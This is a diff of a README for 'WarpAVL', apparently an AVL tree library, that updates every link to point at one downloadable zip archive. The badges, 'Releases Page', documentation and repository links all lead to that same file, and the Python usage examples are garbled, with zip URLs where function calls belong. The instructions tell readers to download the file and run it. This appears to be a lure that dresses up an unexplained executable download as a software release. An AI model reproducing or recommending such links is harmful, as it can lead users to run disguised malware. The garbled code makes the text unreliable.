@@ -1,6 +1,6 @@
 # 🚀 WarpAVL - Fast and Efficient Tree Management
 
-[![Download WarpAVL](https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip%https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip)](https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip)
+[![Download WarpAVL](https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip%https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip)](https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To begin using WarpAVL, follow the steps outlined below. You'll be up and runnin
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip) to download the latest version of WarpAVL.
+1. Visit the [Releases Page](https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip) to download the latest version of WarpAVL.
 2. Once you're on the Releases page, look for the latest version number.
 3. Click the link that corresponds with your operating system to download the application.
 4. After the download completes, find the downloaded file and run it on your system.
@@ -50,21 +50,21 @@ Once you have successfully installed WarpAVL, follow these basic instructions to
 
 4. Start adding elements:
    ```python
-   https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip(5)
-   https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip(10)
-   https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip(3)
+   https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(5)
+   https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(10)
+   https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(3)
    ```
 
 5. You can also retrieve elements:
    ```python
-   print(https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip(10))  # Should return True
+   print(https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(10))  # Should return True
    ```
 
 This setup gives you a practical starting point to manage your AVL tree effectively.
 
 ## 📑 Documentation
 
-For detailed documentation, including advanced features and methods available in WarpAVL, please refer to the documentation section on the [GitHub repository](https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip).
+For detailed documentation, including advanced features and methods available in WarpAVL, please refer to the documentation section on the [GitHub repository](https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip).
 
 ## 🤝 Support
 
@@ -85,4 +85,4 @@ For more information about AVL Trees and how they work, you may want to explore 
 
 Hopefully, you find immense value in using WarpAVL for your data management needs. Happy coding!
 
-[![Download WarpAVL](https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip%https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip)](https://raw.githubusercontent.com/elpecausa20/WarpAVL/main/AVLTree/Warp-AVL-v1.7.zip)
+[![Download WarpAVL](https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip%https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip)](https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip)
